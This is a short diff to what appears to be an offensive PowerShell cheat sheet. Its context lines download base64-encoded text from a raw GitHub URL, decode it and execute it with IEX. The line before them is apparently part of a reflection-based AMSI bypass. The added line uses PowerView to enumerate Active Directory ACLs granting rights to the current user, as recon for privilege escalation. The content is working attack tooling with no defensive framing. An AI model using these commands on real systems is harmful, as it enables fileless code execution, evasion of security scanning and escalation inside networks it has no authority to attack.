@@ -10,3 +10,5 @@ $g=$f.GetValue($null)
 $EncodedText = (new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/Yogehi/yayrandombinariesyay/main/<textfile>.txt')
 $DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
 $DecodedText | IEX
+
+Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}                                                                                     
